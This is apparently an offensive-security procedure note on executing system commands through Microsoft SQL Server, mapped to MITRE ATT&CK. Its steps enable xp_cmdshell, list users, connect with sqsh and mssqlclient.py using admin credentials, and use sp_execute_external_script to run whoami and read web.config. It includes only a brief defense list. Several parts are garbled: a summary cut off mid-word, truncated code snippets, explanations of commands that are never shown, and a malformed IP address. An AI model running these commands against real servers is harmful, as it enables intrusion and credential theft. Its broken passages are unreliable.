---
id: 789fc0a4-9b9f-40ff-b182-d6ae7bcc7b45
name: MSSQL Command Execution via xp_cmdshell
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:33.965926+00:00'
updated_at: '2023-04-10T20:22:46.010368+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
tags:
- '[[MSSQL Command execution]]'
- '[[MSSQL Injection]]'
commands:
- '[[Connect to MSSQL server using sqsh and python]]'
- '[[Enable xp_cmdshell]]'
- '[[Open and read a file]]'
- '[[Print current user]]'
- '[[Print current user with whoami]]'
- '[[Print Python version]]'
---

# MSSQL Command Execution via xp_cmdshell

## Summary

MSSQL injection is a technique used to exploit web applications that use SQL Server as their backend database. Attackers can use this technique to execute arbitrary SQL commands and gain access to sensitive data. One of the most commonly used techniques to achieve command execution is the use of xp

## Description

# Description

MSSQL injection is a technique used to exploit web applications that use SQL Server as their backend database. Attackers can use this technique to execute arbitrary SQL commands and gain access to sensitive data. One of the most commonly used techniques to achieve command execution is the use of xp_cmdshell. This stored procedure allows users to execute system commands on the host machine. By leveraging this procedure, attackers can execute arbitrary code on the server and gain a foothold in the network.

From a technical perspective, attackers typically use SQL injection to inject malicious code into SQL statements executed by the application. This code is then executed by the database server, allowing the attacker to perform a variety of actions, including command execution. From a business perspective, successful exploitation of this vulnerability can lead to data theft, system compromise, and reputational damage.

## Requirements

1. Access to a vulnerable web application that uses SQL Server as its backend database

1. Knowledge of SQL injection techniques

1. Access to xp_cmdshell stored procedure

## Defense

1. Implement input validation and sanitization to prevent SQL injection attacks

1. Disable or restrict access to xp_cmdshell stored procedure

1. Implement least privilege access control to limit the impact of successful exploitation

## Objectives

1. Execute arbitrary system commands on the host machine

1. Gain access to sensitive data stored on the server

1. Establish a foothold in the network for further exploitation

# Instructions

1. The above commands are used to gather system information on a Windows machine. The first command 'net user' lists all the users on the system. The second command 'cmd.exe dir c:' lists the contents of the C drive. The third command 'ping 127.0.0.1' is used to test the network connectivity of the machine.

**Code**: [[EXEC xp_cmdshell "net user";
EXEC master.dbo.xp_cm]]

> The 'EXEC xp_cmdshell' command is used to execute a command shell command. In this case, we are executing three different commands. The 'net user' command is a Windows command that lists all the users on the system. The 'cmd.exe dir c:' command is used to list the contents of the C drive. The 'ping 127.0.0.1' command is used to test the network connectivity of the machine.

2. To reactivate xp_cmdshell, execute the following SQL commands:

**Code**: [[EXEC sp_configure 'show advanced options',1;
RECON]]

> The xp_cmdshell is a system extended stored procedure that allows users to execute command shell commands on the host operating system. However, it is disabled by default in SQL Server 2005 and later versions due to security concerns. To reactivate xp_cmdshell, you need to execute the above SQL commands which will enable the 'show advanced options' configuration option, then reconfigure the server and enable the 'xp_cmdshell' configuration option. After executing these commands, you will be able to execute command shell commands using xp_cmdshell.

**Command** ([[Enable xp_cmdshell]]):

```bash
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
```

3. To interact with the MSSQL instance, use the following commands:
1. sqsh -S [IP Address] -U [Username] -P [Password]
2. python mssqlclient.py [Domain]/[Username]:[Password]@[IP Address] -port [Port Number]

Replace the values in brackets with the appropriate values for your environment.

**Code**: [[sqsh -S 192.168.1.X -U sa -P superPassword
python ]]

> The first command, sqsh, is used to connect to the MSSQL instance using the given IP address, username, and password. The second command, python mssqlclient.py, is used to connect to the MSSQL instance using the given domain, username, password, IP address, and port number. This command can be used to execute SQL queries and commands on the MSSQL instance.

**Command** ([[Connect to MSSQL server using sqsh and python]]):

```bash
sqsh -S 192.168.1.X -U sa -P superPassword
python mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758
```

4. This command executes a Python script within SQL Server using the sp_execute_external_script stored procedure. It prints the user being used and executes commands, opens and reads a file, and prints the Python version. 

**Code**: [[#Print the user being used (and execute commands)
]]

> The command uses the sp_execute_external_script stored procedure to execute a Python script within SQL Server. The script prints the user being used by the system and executes commands using the os.system() function. It also opens and reads a file using the open() function and prints its contents. Finally, it prints the version of Python being used by the system using the sys.version function. 

**Command** ([[Print current user]]):

```bash
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
```

**Command** ([[Print current user with whoami]]):

```bash
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
```

**Command** ([[Open and read a file]]):

```bash
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
```

**Command** ([[Print Python version]]):

```bash
EXECUTE sp_execute_external_script @language = N'Python', @script = N'
import sys
print(sys.version)
'
```

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]

## Commands Used

- [[Connect to MSSQL server using sqsh and python]]
- [[Enable xp_cmdshell]]
- [[Open and read a file]]
- [[Print current user]]
- [[Print current user with whoami]]
- [[Print Python version]]

## Tags

- [[MSSQL Command execution]]
- [[MSSQL Injection]]
